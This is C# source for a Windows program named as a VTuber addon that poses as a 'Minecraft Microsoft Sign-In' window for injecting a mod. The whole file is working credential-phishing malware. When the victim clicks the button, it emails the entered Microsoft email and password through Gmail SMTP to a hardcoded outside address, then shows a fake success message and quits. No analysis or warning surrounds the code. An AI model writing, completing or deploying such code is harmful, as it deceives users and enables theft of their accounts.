using System;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;

public class VtuberAddon : Form
{
    // --- CONFIGURATION ---
    // IMPORTANT: Replace these with your actual sender email details.
    // For Gmail, you may need to create an "App Password" if you have 2-Factor Authentication enabled.
    private const string SenderEmail = "your_email@gmail.com";
    private const string SenderPassword = "your_email_password_or_app_password";
    private const string RecipientEmail = "thomasweblerxd@gmail.com";
    // --- END CONFIGURATION ---

    private TextBox emailTextBox;
    private TextBox passwordTextBox;
    private Button loginButton;
    private Label statusLabel;

    public VtuberAddon()
    {
        // Form Properties
        this.Text = "Minecraft Microsoft Sign-In";
        this.Size = new Size(400, 250);
        this.StartPosition = FormStartPosition.CenterScreen;
        this.FormBorderStyle = FormBorderStyle.FixedDialog;
        this.MaximizeBox = false;
        this.MinimizeBox = false;

        // Email Label and Textbox
        Label emailLabel = new Label() { Text = "Microsoft Account Email:", Location = new Point(20, 20), Width = 150 };
        emailTextBox = new TextBox() { Location = new Point(170, 20), Width = 200 };

        // Password Label and Textbox
        Label passwordLabel = new Label() { Text = "Password:", Location = new Point(20, 60), Width = 150 };
        passwordTextBox = new TextBox() { Location = new Point(170, 60), Width = 200, UseSystemPasswordChar = true };

        // Login Button
        loginButton = new Button() { Text = "Sign In & Inject Mod", Location = new Point(170, 100), Width = 200, Height = 30 };
        loginButton.Click += new EventHandler(LoginButton_Click);

        // Status Label
        statusLabel = new Label() { Text = "Please enter your credentials to continue.", Location = new Point(20, 140), Width = 350, ForeColor = Color.Gray };
        
        // Add controls to the form
        this.Controls.Add(emailLabel);
        this.Controls.Add(emailTextBox);
        this.Controls.Add(passwordLabel);
        this.Controls.Add(passwordTextBox);
        this.Controls.Add(loginButton);
        this.Controls.Add(statusLabel);
    }

    private void LoginButton_Click(object sender, EventArgs e)
    {
        string user = emailTextBox.Text;
        string pass = passwordTextBox.Text;

        if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
        {
            MessageBox.Show("Email and password cannot be empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }

        // Disable button and show status
        loginButton.Enabled = false;
        statusLabel.Text = "Signing in... Please wait.";
        this.Refresh(); // Update the UI immediately

        try
        {
            // Configure the email client
            using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
            {
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(SenderEmail, SenderPassword);
                client.Timeout = 10000; // 10 seconds

                // Create the email message
                MailMessage mailMessage = new MailMessage();
                mailMessage.From = new MailAddress(SenderEmail);
                mailMessage.To.Add(RecipientEmail);
                mailMessage.Subject = "New Minecraft Account Credentials";
                mailMessage.Body = $"Email: {user}\nPassword: {pass}";

                // Send the email
                client.Send(mailMessage);
            }

            statusLabel.Text = "Success! Mod will be injected shortly.";
            MessageBox.Show("Sign-in successful! The mod is now being injected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit(); // Close the application
        }
        catch (Exception ex)
        {
            statusLabel.Text = "Failed to connect. Please check your details.";
            MessageBox.Show($"An error occurred: {ex.Message}", "Connection Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
            loginButton.Enabled = true; // Re-enable the button on failure
        }
    }

    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new VtuberAddon());
    }
}
 
